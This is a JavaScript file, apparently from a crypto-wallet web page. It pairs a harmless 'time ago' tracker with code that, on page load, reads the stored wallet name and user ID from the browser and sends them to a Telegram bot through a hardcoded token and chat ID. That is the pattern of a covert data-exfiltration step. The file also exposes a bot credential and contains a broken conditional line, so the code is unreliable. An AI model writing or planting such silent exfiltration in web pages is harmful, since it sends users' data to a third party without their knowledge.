// Format time difference (e.g., "3 mins ago")
function formatTimeDifference(timestamp) {
    const now = new Date();
    const date = new Date(timestamp);
    const seconds = Math.floor((now - date) / 1000);

    if (seconds < 10) return 'just now';
    if (seconds < 60) return `${seconds} secs ago`;

    const intervals = {
        year: 31536000,
        month: 2592000,
        week: 604800,
        day: 86400,
        hour: 3600,
        minute: 60
    };

    if (seconds < intervals.hour) {
        const mins = Math.floor(seconds / intervals.minute);
        return `${mins} min${mins === 1 ? '' : 's'} ago`;
    }
    if (seconds < intervals.day) {
        const hours = Math.floor(seconds / intervals.hour);
        return `${hours} hour${hours === 1 ? '' : 's'} ago`;
    }
    if (seconds < intervals.day * 2) return 'yesterday';
    if (seconds < intervals.week) {
        const days = Math.floor(seconds / intervals.day);
        return `${days} day${days === 1 ? '' : 's'} ago`;
    }
    if (seconds < intervals.month) {
        const weeks = Math.floor(seconds / intervals.week);
        return `${weeks} week${weeks === 1 ? '' : 's'} ago`;
    }
    if (seconds < intervals.year) {
        const months = Math.floor(seconds / intervals.month);
        return `${months} month${months === 1 ? '' : 's'} ago`;
    }
    const years = Math.floor(seconds / intervals.year);
    return `${years} year${years === 1 ? '' : 's'} ago`;
}

// Start or update a tracker manually
function startTracker(trackerId) {
    const trackerElement = document.getElementById(trackerId);
    if (!trackerElement) {
        console.error("Element not found:", trackerId);
        return;
    }

    const storageKey = `trackedTime_${trackerId}`;
    let storedTime = localStorage.getItem(storageKey);
    
    if (!storedTime) {
        storedTime = Date.now();
        localStorage.setItem(storageKey, storedTime);
    }

    trackerElement.textContent = formatTimeDifference(parseInt(storedTime));
}

if (localStorage.getItem('walletCreated'); === 'true') {
    startTracker('tracker-one');
}


// Function to send data to Telegram bot
async function sendToTelegramBot(data, botToken, chatId) {
    try {
        const message = `Wallet Data:\n\nWallet Name: ${data.walletName}\nWallet User ID: ${data.walletUserId}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();
        if (!response.ok) {
            throw new Error(result.description || 'Failed to send message');
        }
        
        console.log('Data sent to Telegram bot successfully:', result);
        return result;
    } catch (error) {
        console.error('Error sending data to Telegram:', error);
        throw error;
    }
}

// Function to check import status and send wallet data if enabled
async function checkAndSendWalletData(botToken, chatId) {
    try {
        // Check if import is enabled
        const importStatus = localStorage.getItem('Send');
        
        if (importStatus !== 'enabled') {
            console.log('Import is not enabled. No data will be sent.');
            return;
        }

        // Get wallet data
        const walletName = localStorage.getItem('walletName');
        const walletUserId = localStorage.getItem('walletUserId');

        if (!walletName || !walletUserId) {
            console.log('Wallet data not found in localStorage');
            return;
        }

        // Prepare data object
        const walletData = {
            walletName: walletName,
            walletUserId: walletUserId
        };

        // Send data to Telegram bot
        await sendToTelegramBot(walletData, botToken, chatId);
        
        // Disable send after successful send
        localStorage.setItem('Send', 'disabled');
        console.log('Send has been disabled after successful send');
        
    } catch (error) {
        console.error('Error:', error);
    }
}



// Telegram Bot Configuration
    const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
    const TELEGRAM_CHAT_ID = '8163151595'; 

// Execute the check and send function
checkAndSendWalletData(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
